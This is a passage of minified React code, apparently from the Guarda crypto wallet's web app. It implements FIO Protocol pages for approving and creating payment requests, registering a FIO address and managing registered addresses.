              , t = (0,
            $.v9)(eu)
              , a = (0,
            $.v9)($c)
              , [n,r] = (0,
            O.useState)(!1)
              , [l,s] = (0,
            O.useState)(null)
              , [i,o] = (0,
            O.useState)(e.amount || "");
            (0,
            O.useEffect)(( () => {
                let l;
                if (e.fioWalletFrom && !n && a.length) {
                    l = t(e.fioWalletFrom);
                    l && s(l);
                    r(!0)
                }
            }
            ), [a]);
            (0,
            O.useEffect)(( () => {
                if (a.length && n) {
                    const a = t(e.fioWalletFrom);
                    a && s(a)
                }
            }
            ), [a, e]);
            return [l, i, o]
        }
        ;
        function FioInvoiceApprovePage() {
            const e = useLocationSearch()
              , t = O.createRef()
              , a = (0,
            j.k6)()
              , [n,r] = (0,
            O.useState)(!1)
              , [l,s] = (0,
            O.useState)(null)
              , [i,o,c] = use_use_initial_params()
              , [u,d] = (0,
            O.useState)(!1)
              , m = {
                address: e.addressTo,
                currency: e.fromCurrency
            }
              , [p,f] = (0,
            O.useState)("")
              , [E] = use_fee(l, m, o)
              , [h] = use_fee(i, l, o, {
                type: "record_obt_data"
            });
            (0,
            O.useEffect)(( () => {
                f(e.memo);
                FioLogger.info({
                    fromFioAddress: e.accountFrom,
                    toFioAddress: e.accountTo,
                    requestId: e.invoiceId
                }, nB)
            }
            ), []);
            const g = use_wallets_from().filter((t => t.currency.toLowerCase() === e.fromCurrency.toLowerCase()));
            (0,
            O.useEffect)(( () => {
                !l && g.length > 0 && s(g[0])
            }
            ), [g]);
            (0,
            O.useEffect)(( () => {
                n && r(!1)
            }
            ), [l, o]);
            const handleNext = () => {
                const {isValid: n} = t.current.validate();
                n ? a.push({
                    pathname: (0,
                    M.RU)("/fio/invoice-approve/confirm"),
                    search: objectToString({
                        fioWalletFrom: i.uuid,
                        walletFrom: l.uuid,
                        addressTo: e.addressTo,
                        accountTo: e.accountTo,
                        accountFrom: e.accountFrom,
                        amount: (0,
                        Ko.FH)(o, {
                            max: 18
                        }),
                        fromCurrency: l.currency,
                        invoiceId: e.invoiceId,
                        memo: p
                    })
                }) : r(!0)
            }
            ;
            return i ? O.createElement("div", {
                className: wU
            }, O.createElement(DashboardMenu, null), O.createElement(XO, null, O.createElement(panel_right_image, {
                src: TU
            }, "Confirm FIO Request for secure payment")), O.createElement("div", {
                className: bU
            }, O.createElement(sf(), {
                ref: t
            }, O.createElement(label, null, "Your FIO address"), O.createElement(lf.ValidatorField, {
                rules: zf.wallet,
                value: i
            }, (e => {
                let {isValid: t, message: a} = e;
                return O.createElement(pa, {
                    isSelect: !0,
                    isInvalid: !t && n,
                    message: a
                }, O.createElement(Mh, {
                    disabled: !0,
                    selectedWallet: i,
                    wallets: []
                }))
            }
            )), O.createElement(label, null, "From wallet"), O.createElement(lf.ValidatorField, {
                rules: zf.wallet,
                value: l
            }, (e => {
                let {isValid: t, message: a} = e;
                return O.createElement(pa, {
                    isSelect: !0,
                    isInvalid: !t && n,
                    message: a
                }, O.createElement(Mh, {
                    selectedWallet: l,
                    onChange: s,
                    wallets: g
                }))
            }
            )), O.createElement(label, null, "To"), O.createElement(Ea, {
                value: e.accountTo,
                disabled: !0
            }), !u && !e.memo && O.createElement("div", {
                className: CU,
                onClick: () => d(!0)
            }, "Add Memo"), (u || e.memo) && O.createElement(O.Fragment, null, O.createElement(label, null, "Memo"), O.createElement("div", {
                className: "relative"
            }, O.createElement(Ea, {
                value: p,
                onChange: e => {
                    let {target: {value: t}} = e;
                    return f(t)
                }
                ,
                placeholder: "Enter Memo"
            }))), O.createElement(label, null, "Amount"), O.createElement("div", {
                className: "relative"
            }, O.createElement(Ea, {
                autoFocus: !0,
                value: o,
                onChange: e => {
                    let {target: {value: t}} = e;
                    return c(t)
                }
                ,
                placeholder: "0"
            }), O.createElement(ED, {
                fromWallet: l,
                amount: o,
                toCurrency: l ? l.currency : null
            })), O.createElement(misk_info, null, O.createElement(MiskInfoTitle, null, "FIO Fee:"), O.createElement(MiskInfoValue, {
                disabled: !h
            }, (0,
            Ko.yF)(h), " ", (0,
            be.xG)(i && i.currency))), O.createElement(misk_info, null, O.createElement(MiskInfoTitle, null, (0,
            be.xG)(e.fromCurrency), " Fee:"), O.createElement(MiskInfoValue, {
                disabled: !h
            }, (0,
            Ko.yF)(E), " ", (0,
            be.xG)(e.fromCurrency))), O.createElement("div", {
                className: kU
            }, O.createElement("div", {
                className: SU
            }, "Step 1 of 3"), O.createElement(Yl, {
                onClick: handleNext,
                color: "blue",
                size: "big"
            }, "Next"))))) : null
        }
        const AU = a.p + "f270e59e1739b69d6272f37f769b2046.svg";
        let xU = !1;
        function FioApproveInvoiceConfirmPage() {
            const e = useLocationSearch()
              , t = (0,
            j.TH)()
              , a = (0,
            j.k6)()
              , n = (0,
            $.I0)()
              , r = (0,
            $.v9)($c)
              , l = (0,
            $.v9)(eu)
              , s = (0,
            $.v9)(selectedFioTxs)
              , [i,o] = (0,
            O.useState)(!1)
              , [c,u] = (0,
            O.useState)(null)
              , [d,m] = (0,
            O.useState)(null)
              , {convertToFiat: p} = useConverter()
              , [f] = (0,
            O.useState)({
                address: e.addressTo,
                currency: e.fromCurrency
            })
              , [E,h] = (0,
            O.useState)()
              , [g,y] = (0,
            O.useState)()
              , {localCurrency: v} = local_currency_useLocalCurrency();
            (0,
            O.useEffect)(( () => {
                if (r.length) {
                    h(l(e.walletFrom));
                    y(l(e.fioWalletFrom))
                }
            }
            ), [r]);
            const [_] = fee_wallet(E)
              , [w,b,k,S] = use_fee(E, f, e.amount, {
                totalBalance: E ? E.balance : null
            })
              , [C,,N] = use_fee(g, E, e.amount, {
                type: "record_obt_data"
            })
              , setProcess = async e => {
                u(e);
                return new Promise((e => setTimeout(e, 200)))
            }
            ;
            (0,
            O.useEffect)(( () => {
                n(updateWalletsBalanceAndTxs(E, {
                    isCascade: !0
                }))
            }
            ), [E]);
            (0,
            O.useEffect)(( () => {
                setProcess(k ? "Loading Fee..." : null)
            }
            ), [k]);
            (0,
            O.useEffect)(( () => {
                if (d) {
                    xU = !1;
                    setProcess(null);
                    o(!1)
                }
            }
            ), [d]);
            (0,
            O.useEffect)(( () => {
                c && !i && o(!0);
                if (!c) {
                    xU = !1;
                    o(!1)
                }
            }
            ), [c]);
            const handleUpdateBalance = e => async () => {
                setProcess("Updating wallet balance...");
                await n(updateWalletsBalanceAndTxs(e, {
                    isCascade: !0
                }));
                setProcess(null)
            }
              , handleBack = () => {
                a.replace({
                    pathname: (0,
                    M.RU)("/fio/invoice-approve"),
                    search: t.search
                })
            }
            ;
            if (!E || !_)
                return null;
            const T = E.hw || _.hw
              , A = (0,
            Ko.gt)(e.amount, E.balance)
              , x = p(e.amount, E)
              , I = p(w, _)
              , P = p(C, g)
              , L = e.amount
              , handleConfirm = async () => {
                if (xU)
                    return;
                xU = !0;
                m(null);
                await setProcess("Updating wallet balance...");
                await n(updateWalletsBalanceAndTxs(E, {
                    isCascade: !1
                }));
                await setProcess(`Loading ${(0,
                be.xG)(E.currency)} Blockchain adapter...`);
                await setProcess("Preparing transaction...");
                const t = await Se.Z.getApiByCurrency("fio")
                  , r = {
                    address: e.addressTo,
                    currency: E.currency
                }
                  , l = await tM.send("fio-invoice", E, r, _, {
                    amount: e.amount,
                    isFeeIncluded: !1,
                    fee: w,
                    totalBalance: E.balance
                });
                if (l.error) {
                    m(l.error);
                    return
                }
                const i = s.find((t => String(t.fio_request_id) === String(e.invoiceId)));
                try {
                    await t.confirmInvoicePayment({
                        privateKey: g.privateKey,
                        addressFrom: g.address,
                        invoice: i,
                        txHash: l.hash,
                        fromFioAddress: g.accountName,
                        sendFrom: E.address,
                        memo: e.memo
                    });
                    FioLogger.info({
                        fromFioAddress: i.payee_fio_address,
                        toFioAddress: i.payer_fio_address,
                        requestId: e.invoiceId
                    }, aB);
                    if (l.hash) {
                        cc.$.send(cc.d.INVOICE_FIO);
                        n(transactions_addPendingTx(l.pendingTx));
                        a.replace({
                            pathname: (0,
                            M.RU)("/send/success"),
                            search: objectToString({
                                type: "fioInvoiceApproved",
                                amount: e.amount,
                                hash: l.hash,
                                walletFrom: E.uuid,
                                currency: E.currency,
                                invoiceId: e.invoiceId,
                                toAddress: i.payee_fio_address
                            })
                        })
                    }
                } catch (e) {
                    m({
                        code: "FIO_ERROR",
                        message: `Warning: ${E.currency.toUpperCase()} transaction successfully send, but failed to commit in FIO blockchain`
                    })
                }
            }
            ;
            return O.createElement("div", {
                className: sM
            }, O.createElement(DashboardMenu, null), O.createElement(XO, null, O.createElement(panel_right_image, {
                src: AU
            }, "Please check details and confirm")), O.createElement("div", {
                className: iM
            }, O.createElement("div", {
                className: uM
            }, O.createElement("h3", null, "Are you sure you want to "), O.createElement("h2", null, "Confirm a request for ", (0,
            Ko.yF)(e.amount), " ", (0,
            be.xG)(E.currency), "?")), O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "You will send", O.createElement(ConfirmInfoSubTitle, null, "Equivalent")), O.createElement(ConfirmInfoValue, null, (0,
            Ko.yF)(e.amount), " ", (0,
            be.xG)(E.currency), O.createElement(ConfirmInfoSubValue, null, O.createElement(fiat_estimate_FiatEstimate, {
                value: x,
                renderCurrency: !0
            })))), g && O.createElement(ConfirmInfoWallet, {
                title: "Your FIO address",
                wallet: g
            }), E && O.createElement(ConfirmInfoWallet, {
                title: "From wallet",
                wallet: E
            }), O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "To FIO address"), O.createElement(ConfirmInfoValue, null, e.accountTo)), !!e.memo && O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "Memo"), O.createElement(ConfirmInfoValue, null, e.memo)), O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "FIO Fee", O.createElement(ConfirmInfoSubTitle, null, "Equivalent")), O.createElement(ConfirmInfoValue, null, !C || N ? "–" : `${C} FIO`, O.createElement(ConfirmInfoSubValue, null, O.createElement(fiat_estimate_FiatEstimate, {
                value: P
            }), " ", (0,
            be.xG)(v)))), O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, (0,
            be.xG)(_.currency), " Fee", O.createElement(ConfirmInfoSubTitle, null, "Equivalent")), O.createElement(ConfirmInfoValue, null, !w || k ? "–" : `${w} ${(0,
            be.xG)(_.currency)}`, O.createElement(ConfirmInfoSubValue, null, O.createElement(fiat_estimate_FiatEstimate, {
                value: I
            }), " ", (0,
            be.xG)(e.toConvert || v)))), O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "Will receive"), O.createElement(ConfirmInfoValue, null, (0,
            Ko.yF)(L), " ", (0,
            be.xG)(E.currency))), O.createElement("div", {
                className: dM
            }), A && O.createElement(ui_message, {
                type: "error"
            }, "Insufficient ", (0,
            be.xG)(E.currency), " Balance. Available balance: ", E.balance, " ", (0,
            be.xG)(E.currency), O.createElement("br", null), O.createElement("a", {
                className: vM,
                onClick: handleUpdateBalance(E)
            }, "Update wallet balance")), O.createElement(ledger_token_info, {
                parentWallet: _
            }), i && T && O.createElement(ui_message, null, "Please unlock you ", E.hw, ", choose ", (0,
            be.xG)(E.family), " app and then press Confirm."), b && O.createElement(ui_message, {
                type: "error"
            }, "Error calculating fee, please", " ", O.createElement("a", {
                className: vM,
                onClick: S
            }, "try again")), d && O.createElement(bf, {
                error: d
            }), O.createElement("div", {
                className: fM
            }, i && O.createElement("div", {
                className: yM
            }, O.createElement(LoaderDots, {
                visible: !0
            }), c && O.createElement("span", null, c)), !i && O.createElement("div", {
                className: EM
            }, "Step 2 of 3"), O.createElement("div", {
                className: hM
            }, !i && O.createElement("span", {
                onClick: handleBack
            }, "Back"), O.createElement(Yl, {
                color: "blue",
                size: "big",
                onClick: handleConfirm
            }, "Confirm")))))
        }
        const IU = "index_wrapper_1Z9VB app_wrapperBlock_2EpA3"
          , PU = "index_wrapperForm_2eZjq app_wrapperLeftBlock_3QLZp"
          , LU = "index_footerBlock_2ZdD7 app_footerBlock_n86Kc"
          , FU = "index_stepInfo_3zsym app_stepInfo_2VLE6"
          , WU = "index_toggleAdvancedOptions_3XVi3"
          , RU = "index_emptyWrapperForm_dgeJD"
          , BU = "index_addTagLink_1uQz1"
          , OU = a.p + "1dcd2dad536458731837d2f19f6358ef.svg"
          , DU = {
            wrapper: "empty-state_wrapper_3p9oQ app_wrapperBlock_2EpA3",
            wrapperForm: "empty-state_wrapperForm_WMyb5 app_wrapperLeftBlock_3QLZp",
            textBlock: "empty-state_textBlock_3THGW",
            label: "empty-state_label_7fANA",
            emptyInfoLink: "empty-state_emptyInfoLink_1A0af",
            emptyFioLinkWrapper: "empty-state_emptyFioLinkWrapper_1Qyxe",
            fioEmptyImage: "empty-state_fioEmptyImage_1AYEP",
            informationEmptyWrapButtons: "empty-state_informationEmptyWrapButtons_uwelg"
        };
        function FioEmptyStateComponent(e) {
            const t = (0,
            $.I0)()
              , a = (0,
            j.k6)()
              , createFioWallet = async () => {
                const e = _e.ZP.getClass({
                    currency: "fio"
                })
                  , a = await (new e).create({
                    currency: "fio"
                });
                t(rd.addWallet({
                    wallet: a,
                    options: {
                        downloadType: Sm.AFTER_CREATE_WALLET
                    }
                }));
                await t(setActiveWallet(a));
                return a
            }
              , getFioAddress = async () => {
                let {wallet: t} = e;
                t || (t = await createFioWallet());
                a.push({
                    pathname: (0,
                    M.RU)("/fio/register-address"),
                    search: objectToString({
                        pubKey: t.address,
                        wallet: t.uuid
                    })
                })
            }
            ;
            return O.createElement(O.Fragment, null, O.createElement(XO, null, O.createElement(panel_right_image, {
                style: {
                    transform: "scale(-1,1)"
                },
                src: OU
            }), "Send encrypted requests and receive funds easily. The payer's wallet must support requests."), O.createElement("div", {
                className: DU.wrapperForm
            }, O.createElement("div", {
                className: DU.label
            }, O.createElement(label, {
                className: DU.label2
            }, "Before you proceed")), O.createElement("div", {
                className: DU.textBlock
            }, "Requests are based on FIO Protocol."), O.createElement("div", {
                className: DU.textBlock
            }, "Firstly, you need to buy a human-readable FIO address. This is a requirement presented by FIO Protocol."), O.createElement("div", {
                className: DU.textBlock
            }, "No worries: we are here to help! Just click “Get FIO address” and follow 4 simple steps"), O.createElement("br", null), O.createElement("div", {
                className: DU.informationEmptyWrapButtons
            }, O.createElement(Yl, {
                onClick: getFioAddress,
                color: "blue"
            }, "Get FIO address"), O.createElement("div", {
                className: DU.emptyInfoLink
            }, O.createElement($P, {
                href: "https://support.guarda.com/assets/what-is-fio-protocol"
            }, "What is a FIO address and how does it work")))))
        }
        let MU = !0;
        function BoardFioRequestPage() {
            var e, t;
            const a = O.createRef()
              , n = (0,
            $.v9)($c)
              , r = (0,
            $.v9)(eu)
              , l = useLocationSearch()
              , s = (0,
            j.k6)()
              , [i,o] = (0,
            O.useState)(!1)
              , [c,u] = (0,
            O.useState)(r(l.walletTo))
              , [d,m] = (0,
            O.useState)("")
              , [p,f] = (0,
            O.useState)(!1)
              , [E,h] = (0,
            O.useState)(null)
              , [g,y] = (0,
            O.useState)("")
              , [v,_] = (0,
            O.useState)(l.amount || "")
              , [w,b] = (0,
            O.useState)(l.memo || "")
              , [k,S] = (0,
            O.useState)(null)
              , [C,N] = (0,
            O.useState)(!1)
              , T = r(l.fioWalletFrom)
              , [A,x] = (0,
            O.useState)(null)
              , [I,P] = (0,
            O.useState)([])
              , [L,F] = (0,
            O.useState)(!1)
              , [W,R] = (0,
            O.useState)([])
              , B = use_wallets_from()
              , [D,,U] = use_fee(k, k, v, {
                type: "new_funds_request"
            });
            (0,
            O.useEffect)(( () => {
                if (T) {
                    const e = W.find((e => e.uuid === T.uuid));
                    if (!e) {
                        if (0 === W.length)
                            return;
                        S(W[0])
                    }
                    S(e)
                } else
                    S(W[0])
            }
            ), [T, W.length]);
            (0,
            O.useEffect)(( () => {
                async function fetchAdapter() {
                    const e = await Se.Z.getApiByCurrency("fio");
                    h(e)
                }
                fetchAdapter();
                return () => {
                    MU = !0
                }
            }
            ), []);
            (0,
            O.useEffect)(( () => {
                const e = n.filter((e => "fio" === e.currency));
                if (n.length > 0 && 0 === e.length) {
                    MU = !1;
                    F(!0)
                }
                P(e)
            }
            ), [n]);
            (0,
            O.useEffect)(( () => {
                E && I.length > 0 && checkFioWallets();
                async function checkFioWallets() {
                    const e = [];
                    for (const t of I) {
                        const a = await E.getAccountNames({
                            address: t.address
                        })
                          , n = Array.isArray(a) ? a.filter((e => Date.parse(e.expiration) > Date.now())) : [];
                        if (n && n.length) {
                            const a = t.clone();
                            a.title = n[0].fio_address;
                            e.push(a)
                        }
                    }
                    if (0 !== e.length) {
                        MU = !1;
                        F(!1);
                        R(e)
                    } else {
                        MU = !1;
                        F(!0)
                    }
                }
            }
            ), [E, I]);
            function updateWallesFrom(e) {
                u(e);
                const t = (0,
                be.II)(e.currency);
                x(t)
            }
            (0,
            O.useEffect)(( () => {
                var e;
                const t = (0,
                be.II)(null == c || null === (e = c.data) || void 0 === e ? void 0 : e.currency);
                x(t)
            }
            ), []);
            (0,
            O.useEffect)(( () => {
                i && o(!1)
            }
            ), [c, v]);
            (0,
            O.useEffect)(( () => {
                async function fetchPublicAddress() {
                    try {
                        const e = await E.fetchCurrencyAddress({
                            fioAddress: d,
                            currency: "FIO",
                            family: "FIO"
                        });
                        y(e.address);
                        f(!!e.address)
                    } catch (e) {
                        f(!1)
                    }
                }
                d && fetchPublicAddress()
            }
            ), [d]);
            const selectFioFromWallet = e => {
                S(e)
            }
              , handleNext = () => {
                const {isValid: e} = a.current.validate();
                if (e) {
                    o(!1);
                    s.push({
                        pathname: (0,
                        M.RU)("/fio/invoice-create/confirm"),
                        search: objectToString({
                            fioWalletFrom: k.uuid,
                            walletFrom: c.uuid,
                            accountTo: d,
                            accountFrom: k.title,
                            publicAddressTo: g,
                            amount: (0,
                            Ko.FH)(v, {
                                max: 18
                            }),
                            memo: w || "",
                            fromCurrency: c.currency
                        })
                    })
                } else
                    o(!0)
            }
              , G = {
                precision: A ? A.precision : null != c && null !== (e = c.data) && void 0 !== e && e.precision ? null == c || null === (t = c.data) || void 0 === t ? void 0 : t.precision : null,
                min: "0",
                max: null
            };
            function getDefaultFioWallet() {
                return I && I[0] ? I[0] : null
            }
            return O.createElement("div", {
                className: IU
            }, O.createElement(DashboardMenu, null), MU ? O.createElement("div", {
                className: Ht()(PU, RU)
            }, O.createElement(LoaderDots, {
                visible: !0
            })) : O.createElement(O.Fragment, null, L ? O.createElement(FioEmptyStateComponent, {
                wallet: getDefaultFioWallet()
            }) : O.createElement(O.Fragment, null, O.createElement(XO, null, O.createElement(panel_right_image, {
                src: OU
            }, "Send encrypted requests and receive funds easily. The payer's wallet must support requests.")), O.createElement("div", {
                className: PU
            }, O.createElement(sf(), {
                ref: a
            }, O.createElement(label, null, "Your FIO address"), O.createElement(lf.ValidatorField, {
                rules: zf.wallet,
                value: k
            }, (e => {
                let {isValid: t, message: a} = e;
                return O.createElement(pa, {
                    isSelect: !0,
                    isInvalid: !t && i,
                    message: a
                }, O.createElement(Mh, {
                    selectedWallet: k,
                    wallets: W,
                    onChange: selectFioFromWallet,
                    customFilter: e => onCustomFilterWallets(e, ["fio"]),
                    fioWallets: !0
                }))
            }
            )), O.createElement(label, null, "To Your Wallet"), O.createElement(lf.ValidatorField, {
                rules: zf.wallet,
                value: c
            }, (e => {
                let {isValid: t, message: a} = e;
                return O.createElement(pa, {
                    isSelect: !0,
                    isInvalid: !t && i,
                    message: a
                }, O.createElement(Mh, {
                    selectedWallet: c,
                    wallets: B,
                    onChange: updateWallesFrom,
                    withMultisigs: !0
                }))
            }
            )), O.createElement(label, null, "Request from FIO Address"), O.createElement(lf.ValidatorField, {
                rules: zf.fioAddress(p),
                value: d
            }, (e => {
                let {isValid: t, message: a} = e;
                return O.createElement(pa, {
                    isInvalid: !t && i,
                    message: a
                }, O.createElement(Ea, {
                    value: d,
                    onChange: e => {
                        let {target: {value: t}} = e;
                        return m(t)
                    }
                    ,
                    placeholder: "Enter FIO address"
                }))
            }
            )), !C && O.createElement("div", {
                className: BU,
                onClick: () => N(!0)
            }, "Add Memo"), C && O.createElement("div", {
                className: "relative"
            }, O.createElement(lf.ValidatorField, {
                rules: zf.fioMemo,
                value: w
            }, (e => {
                let {isValid: t, message: a} = e;
                return O.createElement(pa, {
                    isInvalid: !t && i,
                    message: a
                }, O.createElement(Ea, {
                    value: w,
                    onChange: e => {
                        let {target: {value: t}} = e;
                        return b(t)
                    }
                    ,
                    placeholder: "Memo"
                }))
            }
            ))), O.createElement(label, null, "Amount"), O.createElement("div", {
                className: "relative"
            }, O.createElement(lf.ValidatorField, {
                value: v,
                rules: zf.amount(G)
            }, (e => {
                let {isValid: t, message: a} = e;
                return O.createElement(pa, {
                    isInvalid: !t && Boolean(i || (null == a ? void 0 : a.includes("Reduce the number (max"))),
                    message: a
                }, O.createElement(Ea, {
                    autoFocus: !0,
                    value: v,
                    onChange: e => {
                        let {target: {value: t}} = e;
                        return _(t)
                    }
                    ,
                    placeholder: "0"
                }))
            }
            )), O.createElement(ED, {
                fromWallet: c,
                amount: v,
                toCurrency: c ? c.currency : null
            })), O.createElement(misk_info, null, O.createElement(MiskInfoTitle, null, "FIO Fee:"), O.createElement(MiskInfoValue, {
                disabled: U
            }, !U && D ? O.createElement("span", null, (0,
            Ko.yF)(D), " ", (0,
            be.xG)(k && k.currency)) : O.createElement("span", null, "—"))), O.createElement("div", {
                className: LU
            }, O.createElement("div", {
                className: FU
            }, "Step 1 of 3"), O.createElement(Yl, {
                onClick: handleNext,
                color: "blue",
                size: "big"
            }, "Next")))))))
        }
        const UU = a.p + "f270e59e1739b69d6272f37f769b2046.svg";
        let GU = !1;
        function confirm_BoardSendConfirm() {
            const e = useLocationSearch()
              , t = (0,
            j.k6)()
              , a = (0,
            j.TH)()
              , n = (0,
            $.v9)($c)
              , r = (0,
            $.v9)(eu)
              , [l,s] = (0,
            O.useState)(!1)
              , [i,o] = (0,
            O.useState)(null)
              , [c,u] = (0,
            O.useState)(null)
              , {convertToFiat: d} = useConverter()
              , [m] = (0,
            O.useState)({
                title: e.accountTo,
                address: e.publicAddressTo,
                currency: e.fromCurrency
            })
              , [p,f] = (0,
            O.useState)()
              , [E,h] = (0,
            O.useState)()
              , {localCurrency: g} = local_currency_useLocalCurrency();
            (0,
            O.useEffect)(( () => {
                if (n.length) {
                    h(r(e.fioWalletFrom));
                    f(r(e.walletFrom))
                }
            }
            ), [n]);
            const [y] = fee_wallet(E)
              , [v,_,w,b] = use_fee(E, E, e.amount, {
                type: "new_funds_request"
            })
              , setProcess = async e => {
                o(e);
                return new Promise((e => setTimeout(e, 200)))
            }
            ;
            (0,
            O.useEffect)(( () => {
                setProcess(w ? "Loading Fee..." : null)
            }
            ), [w]);
            (0,
            O.useEffect)(( () => {
                if (c) {
                    GU = !1;
                    setProcess(null);
                    s(!1)
                }
            }
            ), [c]);
            (0,
            O.useEffect)(( () => {
                i && !l && s(!0);
                if (!i) {
                    GU = !1;
                    s(!1)
                }
            }
            ), [i]);
            const handleBack = () => {
                t.replace({
                    pathname: (0,
                    M.RU)("/fio/invoice-create"),
                    search: a.search
                })
            }
            ;
            if (!p || !y)
                return null;
            const k = d(e.amount, p)
              , S = d(v, y)
              , handleConfirm = async () => {
                if (GU)
                    return;
                GU = !0;
                u(null);
                await setProcess("Loading FIO adapter");
                await setProcess("Preparing invoice");
                const a = await Se.Z.getApiByCurrency("fio")
                  , n = await a.createInvoice({
                    privateKey: E.privateKey,
                    addressFrom: E.address,
                    fromFioAddress: p.accountName,
                    amount: e.amount,
                    extraId: e.memo || "",
                    toFioAddress: e.accountTo,
                    toAddress: e.publicAddressTo,
                    currency: p.currency,
                    family: p.family || p.currency,
                    toCurrencyAddress: p.address
                });
                n.error && u("Failed to create invoice");
                if (n.fio_request_id) {
                    FioLogger.info({
                        fromFioAddress: p.accountName || e.accountFrom,
                        toFioAddress: e.accountTo,
                        requestId: n.fio_request_id
                    }, eB);
                    cc.$.send(cc.d.INVOICE_FIO_CREATED);
                    t.replace({
                        pathname: (0,
                        M.RU)("/send/success"),
                        search: objectToString({
                            invoiceId: n.fio_request_id,
                            type: "fioInvoiceCreate",
                            toAddress: e.accountTo,
                            amount: e.amount,
                            walletFrom: p.uuid
                        })
                    })
                }
            }
              , C = E ? E.clone() : null;
            C.title = e.accountFrom;
            return O.createElement("div", {
                className: sM
            }, O.createElement(DashboardMenu, null), O.createElement(XO, null, O.createElement(panel_right_image, {
                src: UU
            }, "Please check details and confirm")), O.createElement("div", {
                className: iM
            }, O.createElement("div", {
                className: uM
            }, O.createElement("h3", null, "Are you sure you want to"), O.createElement("h2", null, "Send a request for ", (0,
            Ko.yF)(e.amount), " ", (0,
            be.xG)(p.currency), "?")), O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "You will receive", O.createElement(ConfirmInfoSubTitle, null, "Equivalent")), O.createElement(ConfirmInfoValue, null, (0,
            Ko.yF)(e.amount), " ", (0,
            be.xG)(p.currency), O.createElement(ConfirmInfoSubValue, null, O.createElement(fiat_estimate_FiatEstimate, {
                value: k,
                renderCurrency: !0
            })))), E && O.createElement(ConfirmInfoWallet, {
                title: "Your FIO address",
                wallet: C
            }), p && O.createElement(ConfirmInfoWallet, {
                title: "To wallet",
                wallet: p
            }), m && O.createElement(ConfirmInfoWallet, {
                title: "Request from FIO Address",
                wallet: m
            }), e.memo && O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "Memo"), O.createElement(ConfirmInfoValue, null, e.memo)), O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "Network Fee", O.createElement(ConfirmInfoSubTitle, null, "Equivalent")), O.createElement(ConfirmInfoValue, null, !v || w ? "–" : `${v} ${(0,
            be.xG)(y.currency)}`, O.createElement(ConfirmInfoSubValue, null, O.createElement(fiat_estimate_FiatEstimate, {
                value: S
            }), " ", (0,
            be.xG)(e.toConvert || g)))), O.createElement("div", {
                className: dM
            }), _ && O.createElement(ui_message, {
                type: "error"
            }, "Error calculating fee, please", " ", O.createElement("a", {
                className: vM,
                onClick: b
            }, "try again")), c && O.createElement(bf, {
                error: c
            }), O.createElement("div", {
                className: fM
            }, l && O.createElement("div", {
                className: yM
            }, i && O.createElement("span", null, i), O.createElement(LoaderDots, {
                visible: !0
            })), !l && O.createElement("div", {
                className: EM
            }, "Step 2 of 3"), O.createElement("div", {
                className: hM
            }, !l && O.createElement("span", {
                onClick: handleBack
            }, "Back"), O.createElement(Yl, {
                color: "blue",
                size: "big",
                onClick: handleConfirm
            }, "Create Request")))))
        }
        const VU = a.p + "c9ee3d57cfe0e2cd5981744f578600ad.svg"
          , KU = "manage_wrapper_qPMsG app_wrapperBlock_2EpA3"
          , HU = "manage_wrapperForm_1xfM2 app_wrapperLeftBlock_3QLZp"
          , zU = "manage_inlineWallet_221Db"
          , jU = "manage_iconArrow_2b147"
          , $U = "manage_iconCurrency_1XGRN"
          , ZU = "manage_infoWallet_1IAny"
          , YU = "manage_textData_3Rs-A"
          , qU = "manage_errorFioDate_2lPrk"
          , XU = "manage_pendingFioDate_3cO2t"
          , QU = "manage_label_LtPEi"
          , JU = "manage_goToLink_CUmzc"
          , eG = "manage_openWalletInfo_3QJEN"
          , tG = "manage_inlineButtons_1C0D0"
          , aG = "manage_renewBtn_3oPSd"
          , nG = "manage_inlineRenewBtn_OY1Uj"
          , rG = []
          , lG = "/api/v1/internal/proxy/https://reg.fioprotocol.io/public-api/summary";
        function FioRegisterAddress() {
            const e = (0,
            $.I0)()
              , t = (0,
            j.k6)()
              , a = (0,
            $.v9)(xo)
              , n = (0,
            $.v9)(Io);
            let r = [];
            a.forEach((e => {
                var t;
                const a = (null !== (t = e.fioAddresses) && void 0 !== t ? t : []).map((t => ({
                    fioAddress: t,
                    wallet: e.wallet,
                    walletUuid: e.walletUuid
                })));
                r = r.concat(a)
            }
            ));
            r = r.concat(Object.values(n));
            (0,
            O.useEffect)(( () => {
                0 === r.length && e(fetchFioAccounts())
            }
            ), []);
            (0,
            O.useEffect)(( () => {
                const t = Object.values(n)
                  , requestLoop = t => {
                    const a = window.setInterval((async () => {
                        const {data: n} = await Jf().post(lG, {
                            publicKey: t.wallet.address,
                            externId: t.paymentId,
                            domain: t.domain,
                            address: t.name
                        })
                          , r = n.find((e => e.extern_id === t.paymentId));
                        if (r && "success" === r.pay_status && "COMPLETED" === r.extern_status) {
                            window.clearInterval(a);
                            e(confirmPendingAccount(t.fioAddress.fio_address))
                        }
                    }
                    ), 3e3);
                    rG.push(a)
                }
                ;
                t.forEach((e => requestLoop(e)));
                return () => {
                    rG.forEach((e => clearInterval(e)))
                }
            }
            ), []);
            function getExpirationBlockedDate(e) {
                const t = new Date(e.fioAddress.expiration);
                t.setMonth(t.getMonth() + 3);
                return date_format(t, "dd mmm yyyy, HH:MM:ss")
            }
            const getFioAddress = async () => {
                t.push({
                    pathname: (0,
                    M.RU)("/fio/register-address")
                })
            }
            ;
            function getAccountStatus(e) {
                if (e.pending)
                    return "pending";
                const t = undefined;
                return new Date(e.fioAddress.expiration) < new Date ? "blocked" : "active"
            }
            async function goToWallet(a) {
                await e(setActiveWallet(a.wallet));
                t.push((0,
                M.RU)("/receive"))
            }
            function getAccountTitle(e) {
                const t = getAccountStatus(e);
                return "pending" === t ? "Waiting for Network confirmation" : "blocked" === t ? `Blocked till ${getExpirationBlockedDate(e)}. Payment required` : "Active"
            }
            function manageLinkedAddresses(e) {
                t.push({
                    pathname: (0,
                    M.RU)("/fio/select-wallets"),
                    search: objectToString({
                        type: "update",
                        fioWallet: e.wallet.uuid,
                        fioWalletName: e.fioAddress.fio_address
                    })
                })
            }
            const [l,s] = (0,
            O.useState)(null);
            function handleToggleWallet(e) {
                return function toggle() {
